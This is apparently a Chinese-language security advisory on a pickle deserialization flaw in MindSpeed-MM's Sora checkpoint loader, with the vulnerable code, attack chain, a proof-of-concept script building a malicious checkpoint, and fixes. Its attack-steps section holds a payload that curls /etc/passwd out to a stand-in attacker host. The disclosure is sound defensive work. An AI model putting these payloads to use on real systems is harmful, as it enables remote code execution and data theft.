# checkpoint-vuln-004：Sora模型Checkpoint加载显式禁用weights_only致RCE

**严重性**: High | **CWE**: CWE-502 | **置信度**: 90/100
**位置**: `checkpoint/sora_model/convert_utils/save_load_utils.py:36` @ `load_from_mm`

---

## 1. 漏洞细节

该漏洞位于 MindSpeed-MM 的 Sora 模型 checkpoint 转换工具中。`load_from_mm()` 函数在加载 Megatron 格式的 checkpoint 文件时使用了 `torch.load()` 并显式设置了 `weights_only=False`，这是一个不安全的反序列化操作。

**核心问题**：
- `torch.load()` 使用 Python 的 `pickle` 模块进行反序列化
- `weights_only=False` 允许 pickle 执行序列化数据中的任意 Python 代码
- checkpoint 文件路径 (`state_dict_path`) 由 `load_dir` 参数构建
- `load_dir` 最终来自外部输入（转换脚本的 CLI 参数或函数调用）
- 攻击者可通过提供恶意 checkpoint 文件实现远程代码执行

**漏洞触发场景**：
- Sora 模型权重转换操作
- 从 Megatron 格式到 HF 格式的转换过程
- 加载分布式训练产生的 checkpoint 分片

## 2. 漏洞代码

### 文件: `checkpoint/sora_model/convert_utils/save_load_utils.py`

```python
import os
import glob
import re
import json
from pathlib import Path
import stat
import shutil
import torch
from safetensors.torch import load_file, save_file
from checkpoint.common.permissions import set_directory_permissions
from checkpoint.common.constant import FILE_MODE

MEGATRON_LASTEST_ITERATION_FILE_NAME = "latest_checkpointed_iteration.txt"
MEGATRON_MODEL_KEY = "model"
MEGATRON_CKPT_NAME = "model_optim_rng.pt"


def load_from_mm(load_dir):
    """从 Megatron 格式加载 checkpoint"""
    flags = os.O_RDONLY
    mode = stat.S_IRUSR

    # 读取迭代号
    iteration_path = os.path.join(load_dir, MEGATRON_LASTEST_ITERATION_FILE_NAME)
    with os.fdopen(os.open(iteration_path, flags, mode)) as f:
        latest_checkpointed_iteration = f.readline()

    # 构建目录路径
    if latest_checkpointed_iteration == "release":
        directory = "release"
    else:
        directory = "iter_{:07d}".format(int(latest_checkpointed_iteration))   

    # 加载所有 PP/TP 分片
    pp_tp_state_dicts = {}
    sub_dirs = os.listdir(os.path.join(load_dir, directory))
    enable_pp = len(sub_dirs[0].split('_')) == 4

    for sub_dir in sub_dirs:
        # ⚠️ 构建 checkpoint 文件路径
        state_dict_path = os.path.join(load_dir, directory, sub_dir, MEGATRON_CKPT_NAME)
        
        # ⚠️ 漏洞触发点：第 36 行
        # torch.load() 使用 weights_only=False，允许执行任意代码
        state_dict = torch.load(state_dict_path, map_location='cpu', weights_only=False)
        
        if enable_pp:
            tp_rank, pp_rank = map(int, (sub_dir.split('_')[2:4]))
            vpp_state_dicts = []
            for key, vpp_state_dict in state_dict.items():
                match = re.match(r'model(\d)', key)
                if match:
                    number = int(match.group(1))
                    vpp_state_dicts.append((number, vpp_state_dict))
            vpp_state_dicts.sort(key=lambda x: x[0])
            state_dict = [vpp_state_dict for _, vpp_state_dict in vpp_state_dicts]
        else:
            pp_rank = 0
            tp_rank = int(sub_dir.split('_')[2])
            state_dict = state_dict[MEGATRON_MODEL_KEY]
        pp_tp_state_dicts[(pp_rank, tp_rank)] = state_dict
    
    pp_size = max([pp_tp_rank[0] for pp_tp_rank in pp_tp_state_dicts.keys()]) + 1
    tp_size = max([pp_tp_rank[1] for pp_tp_rank in pp_tp_state_dicts.keys()]) + 1

    state_dicts = []
    for pp_rank in range(pp_size):
        tp_state_dicts = []
        for tp_rank in range(tp_size):
            tp_state_dicts.append(pp_tp_state_dicts[((pp_rank, tp_rank))])
        state_dicts.append(tp_state_dicts)
    
    return state_dicts


def save_as_mm(save_dir, state_dicts, latest_checkpointed_iteration="release"):
    """保存为 Megatron 格式"""
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    
    flags = os.O_WRONLY | os.O_CREAT
    mode = stat.S_IWUSR | stat.S_IRUSR

    iteration_path = os.path.join(save_dir, MEGATRON_LASTEST_ITERATION_FILE_NAME)
    with os.fdopen(os.open(iteration_path, flags, mode), 'w') as fout:
        fout.write(latest_checkpointed_iteration)    
    ...

def load_from_hf(hf_dir):
    """从 HF 格式加载（使用 safetensors）"""
    ...
    state_dict = {}
    for safe_path in files:
        state_dict.update(load_file(str(safe_path), device='cpu'))  # safetensors 加载
    return state_dict

def load_pt(source_path, module_name=None):
    """加载单个 PT 文件"""
    # ⚠️ 另一处潜在漏洞点（第 152 行）
    state_dict = torch.load(source_path, map_location='cpu')
    if module_name:
        state_dict = state_dict[module_name]
    return state_dict
```

**代码分析**：

1. **第 21-28 行**：从 `load_dir` 构建 checkpoint 目录路径
   - `load_dir` 来自外部调用者（CLI 参数或函数参数）
   - 没有路径验证机制

2. **第 35 行**：构建具体的 checkpoint 文件路径
   - `state_dict_path = os.path.join(load_dir, directory, sub_dir, MEGATRON_CKPT_NAME)`
   - 最终指向 `model_optim_rng.pt` 文件

3. **第 36 行**：**漏洞触发点**
   - `torch.load(state_dict_path, map_location='cpu', weights_only=False)`
   - `weights_only=False` 是危险参数，允许 pickle 执行任意代码

4. **第 152 行**：`load_pt()` 函数中的 `torch.load()` 也是潜在漏洞点

### 调用链分析

`load_from_mm()` 被以下代码调用（需要查找调用者）：

```python
# 可能的调用场景：
# 1. Sora 模型转换脚本
# 2. checkpoint 格式转换工具
# 3. 模型加载/推理脚本
```

## 3. 完整攻击链路

```
[入口点] CLI 参数 / 函数参数 load_dir
↓ 参数传递到转换/加载流程
[中间步骤1] convert_script.py → 转换配置
↓ 提取 checkpoint 目录路径
[中间步骤2] load_from_mm(load_dir)@save_load_utils.py:17
↓ 构建目录路径和迭代号
[中间步骤3] state_dict_path = load_dir/.../model_optim_rng.pt
↓ 构建 checkpoint 文件路径
[漏洞触发] torch.load(state_dict_path, weights_only=False)@line:36
↓ pickle 反序列化执行恶意代码
[攻击结果] 任意代码执行 (RCE)
```

## 4. 攻击场景

**攻击者画像**：
- 能提供恶意 Sora 模型 checkpoint 的攻击者
- 可能是视频生成模型分享者、训练数据提供者

**攻击向量**：
- 分发包含恶意 pickle payload 的 Sora checkpoint 文件
- 通过模型分享平台、邮件附件、共享存储等方式传播

**利用难度**：低

### 攻击步骤

1. **构造恶意 checkpoint**：
   ```python
   import torch
   import os
   
   class RCEPayload:
       def __reduce__(self):
           # 执行恶意命令
           # 示例：窃取数据
           return (os.system, ('curl https://attacker.com/exfil?data=$(cat /etc/passwd)',))
   
   # 构建恶意 checkpoint（伪装成 Sora 模型权重）
   malicious_checkpoint = {
       'model': {
           'diffusion.blocks.0.weight': torch.randn(512, 512),
           'encoder.weight': torch.randn(256, 256),
           'rce_trigger': RCEPayload()  # 嵌入 payload
       },
       'iteration': 10000,
       'optimizer': {}
   }
   
   torch.save(malicious_checkpoint, 'model_optim_rng.pt')
   ```

2. **构建正确目录结构**：
   ```bash
   # PP=1, TP=1 的简单结构
   mkdir -p malicious_sora/release/mp_rank_00
   mv model_optim_rng.pt malicious_sora/release/mp_rank_00/
   echo "release" > malicious_sora/latest_checkpointed_iteration.txt
   
   # 或者 PP=2, TP=2 的分布式结构
   mkdir -p malicious_sora/release/mp_rank_00_000
   mkdir -p malicious_sora/release/mp_rank_00_001
   mkdir -p malicious_sora/release/mp_rank_01_000
   mkdir -p malicious_sora/release/mp_rank_01_001
   # 在每个目录中放置恶意 checkpoint
   ```

3. **诱导用户加载/转换**：
   ```bash
   # 用户执行 Sora 模型转换
   python sora_convert.py --mm_dir malicious_sora --hf_dir output
   
   # 或用户加载模型进行推理
   python inference.py --checkpoint malicious_sora
   
   # 恶意代码被执行
   ```

### 攻击变体

**场景 A：视频生成模型供应链攻击**
- Sora 类模型是热门研究方向
- 攻击者分享声称"高性能"的视频生成模型 checkpoint
- 用户下载并转换/加载该模型时触发漏洞

**场景 B：分布式训练 checkpoint 攻击**
- 针对分布式训练场景，攻击者可能篡改部分分片
- 即使只有一个分片包含 payload，加载时也会触发

## 5. 攻击条件

| 条件类型   | 要求               | 说明                                              |
| ---------- | ------------------ | ------------------------------------------------- |
| 网络可达性 | 不需要             | 攻击通过本地文件触发                              |
| 认证要求   | 不需要             | 任何能执行转换/加载的用户                         |
| 配置依赖   | 默认配置           | 漏洞存在于默认代码                                |
| 环境依赖   | PyTorch 环境       | 需要 torch.load() 功能                            |
| 时序条件   | 用户加载 Sora checkpoint | 需要用户主动执行转换或加载操作               |

**特殊考虑**：
- Sora 类模型通常体积较大（几十 GB），用户更倾向于从外部获取而非自己训练
- 这增加了用户加载第三方 checkpoint 的可能性

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                   |
| -------- | ---- | ------------------------------------------------------ |
| 机密性   | 高   | 可窃取视频生成模型、训练数据、API 凭证、SSH 密钥       |
| 完整性   | 高   | 可修改模型权重植入后门、篡改转换输出                    |
| 可用性   | 高   | 可破坏转换过程、删除文件、导致系统崩溃                  |

**特殊影响 - 视频生成模型后门**：
- 如果攻击者在 checkpoint 中植入隐蔽后门
- 后门模型生成的视频可能包含水印、恶意内容或其他隐藏特征
- 影响所有使用该模型的视频生成服务

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 脚本

```python
#!/usr/bin/env python3
"""
PoC for checkpoint-vuln-004
构造恶意 Sora checkpoint 文件
仅供安全研究使用
"""
import torch
import os
import sys

class MaliciousPayload:
    """恶意 payload 类"""
    def __reduce__(self):
        # 安全验证用 payload
        return (
            os.system,
            ('echo "[checkpoint-vuln-004] Sora RCE Triggered!" && id',)
        )

def create_malicious_sora_checkpoint(vpp_count=1):
    """创建恶意 Sora checkpoint"""
    # 正常 Sora 模型权重结构（伪装）
    diffusion_weights = {
        'diffusion.blocks.0.spatial_conv.weight': torch.randn(256, 256, 3, 3),
        'diffusion.blocks.0.temporal_conv.weight': torch.randn(256, 256, 3, 3),
        'diffusion.blocks.1.spatial_conv.weight': torch.randn(256, 256, 3, 3),
        'encoder.conv.weight': torch.randn(128, 256, 3, 3),
        'decoder.conv.weight': torch.randn(256, 128, 3, 3),
    }
    
    # 添加恶意 payload
    diffusion_weights['malicious_trigger'] = MaliciousPayload()
    
    if vpp_count > 1:
        # Virtual PP (VPP) 格式
        checkpoint = {}
        for i in range(vpp_count):
            checkpoint[f'model{i}'] = diffusion_weights
        checkpoint['checkpoint_version'] = 3.0
    else:
        # 单 PP 格式
        checkpoint = {
            'model': diffusion_weights,
            'iteration': 10000,
            'optimizer': {},
        }
    
    return checkpoint

def setup_sora_checkpoint_dir(output_dir='malicious_sora', pp_size=1, tp_size=1, vpp_size=1):
    """设置 Sora checkpoint 目录结构"""
    import subprocess
    
    # 创建 release 目录
    release_dir = os.path.join(output_dir, 'release')
    os.makedirs(release_dir, exist_ok=True)
    
    # 为每个 PP/TP 组合创建子目录
    for tp_rank in range(tp_size):
        for pp_rank in range(pp_size):
            if pp_size > 1 or tp_size > 1:
                subdir = f'mp_rank_{tp_rank:02d}_{pp_rank:03d}'
            else:
                subdir = f'mp_rank_{tp_rank:02d}'
            
            checkpoint_path = os.path.join(release_dir, subdir)
            os.makedirs(checkpoint_path, exist_ok=True)
            
            # 生成并保存恶意 checkpoint
            checkpoint = create_malicious_sora_checkpoint(vpp_size)
            pt_file = os.path.join(checkpoint_path, 'model_optim_rng.pt')
            torch.save(checkpoint, pt_file)
            
            print(f"[+] Created: {pt_file}")
    
    # 创建迭代号文件
    with open(os.path.join(output_dir, 'latest_checkpointed_iteration.txt'), 'w') as f:
        f.write('release')
    
    print(f"\n[+] Malicious Sora checkpoint created: {output_dir}")
    return output_dir

if __name__ == '__main__':
    output_dir = sys.argv[1] if len(sys.argv) > 1 else 'malicious_sora'
    setup_sora_checkpoint_dir(output_dir, pp_size=1, tp_size=1, vpp_size=1)
    
    print("\n[!] To trigger the vulnerability:")
    print("    Use load_from_mm() function with malicious checkpoint path")
    print("\n    Example:")
    print(f"    from checkpoint.sora_model.convert_utils.save_load_utils import load_from_mm")
    print(f"    load_from_mm('{output_dir}')")
```

### 验证步骤

```bash
# 1. 生成恶意 Sora checkpoint
python poc_checkpoint_vuln_004.py ./test_sora

# 2. 在 Python 中触发漏洞
cd /path/to/MindSpeed-MM
python -c "
import sys
sys.path.insert(0, '.')
from checkpoint.sora_model.convert_utils.save_load_utils import load_from_mm
result = load_from_mm('./test_sora')
print('Loaded:', result)
"

# 3. 预期输出
# 控制台应显示: "[checkpoint-vuln-004] Sora RCE Triggered!"
```

**预期结果**：恶意 payload 在 `torch.load()` 时被执行。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+)
- Python: 3.8+
- PyTorch: 2.0+
- 项目依赖: 按 requirements.txt 安装

### 构建步骤

```bash
git clone <project_url>
cd MindSpeed-MM
pip install -r requirements.txt
pip install torch safetensors
```

### 验证步骤

1. 使用 PoC 脚本生成恶意 Sora checkpoint
2. 通过 Python 调用 `load_from_mm()` 函数加载 checkpoint
3. 观察控制台输出，确认 payload 是否执行

### 预期结果

- 控制台输出恶意 payload 执行结果
- 确认 `torch.load(weights_only=False)` 执行了嵌入的代码

---

## 9. 修复建议

### 紧急修复

**方案 1：移除 weights_only=False 参数**

```python
# 修改 checkpoint/sora_model/convert_utils/save_load_utils.py

# 原代码（第 36 行）：
state_dict = torch.load(state_dict_path, map_location='cpu', weights_only=False)

# 修复方案 A：完全移除 weights_only 参数（默认 True in PyTorch >= 2.0）
state_dict = torch.load(state_dict_path, map_location='cpu')

# 修复方案 B：显式设置 weights_only=True（推荐）
state_dict = torch.load(state_dict_path, map_location='cpu', weights_only=True)
```

**注意**：同样需要修复第 152 行的 `load_pt()` 函数：

```python
def load_pt(source_path, module_name=None):
    # 原代码：
    state_dict = torch.load(source_path, map_location='cpu')
    
    # 修复后：
    state_dict = torch.load(source_path, map_location='cpu', weights_only=True)
    if module_name:
        state_dict = state_dict[module_name]
    return state_dict
```

### 推荐修复方案

**方案 2：优先使用 safetensors 格式**

观察代码中 `load_from_hf()` 函数已经使用 safetensors 加载：

```python
def load_from_hf(hf_dir):
    ...
    state_dict.update(load_file(str(safe_path), device='cpu'))  # 安全的 safetensors 加载
    return state_dict
```

建议为 Megatron 格式也添加 safetensors 支持：

```python
def load_from_mm_safe(load_dir):
    """安全地从 Megatron 格式加载"""
    # 检查是否有 safetensors 格式文件
    safe_path = state_dict_path.replace('.pt', '.safetensors')
    if os.path.exists(safe_path):
        return load_file(safe_path)
    
    # 降级到安全模式的 torch.load
    return torch.load(state_dict_path, map_location='cpu', weights_only=True)
```

**方案 3：添加路径验证和签名检查**

```python
import hashlib

ALLOWED_CHECKPOINT_DIRS = ['/opt/models', '/data/sora_checkpoints', '/home/user/checkpoints']

def validate_load_dir(load_dir: str):
    """验证 checkpoint 目录路径"""
    real_path = os.path.realpath(load_dir)
    for allowed in ALLOWED_CHECKPOINT_DIRS:
        if real_path.startswith(os.path.realpath(allowed)):
            return True
    raise ValueError(f"Checkpoint directory not allowed: {load_dir}")

def load_from_mm(load_dir):
    # 路径验证
    validate_load_dir(load_dir)
    
    # 安全加载
    state_dict = torch.load(state_dict_path, map_location='cpu', weights_only=True)
    ...
```

### 长期建议

1. **格式迁移**：
   - 将所有 Sora checkpoint 从 `.pt` 格式转换为 `.safetensors` 格式
   - safetensors 仅存储张量数据，不支持执行代码，天然安全

2. **API 重构**：
   ```python
   # 创建统一的 checkpoint 加载接口
   def safe_load_checkpoint(path, format='auto'):
       """安全的 checkpoint 加载接口"""
       if format == 'safetensors' or path.endswith('.safetensors'):
           return load_file(path)
       elif path.endswith('.pt'):
           return torch.load(path, weights_only=True)
       else:
           raise ValueError(f"Unsupported checkpoint format: {path}")
   ```

3. **代码审计**：
   - 扫描项目中所有 `torch.load()` 调用
   - 确保所有调用都使用 `weights_only=True`
   - 或迁移到 safetensors 格式

4. **用户教育**：
   - 在文档中警告不要加载来源不明的 checkpoint
   - 提供安全 checkpoint 来源的指导
   - 说明 safetensors 格式的安全优势

5. **供应链安全**：
   - 建立可信 checkpoint 来源白名单
   - 对重要 checkpoint 文件提供签名验证机制
   - 定期审计和扫描使用的第三方模型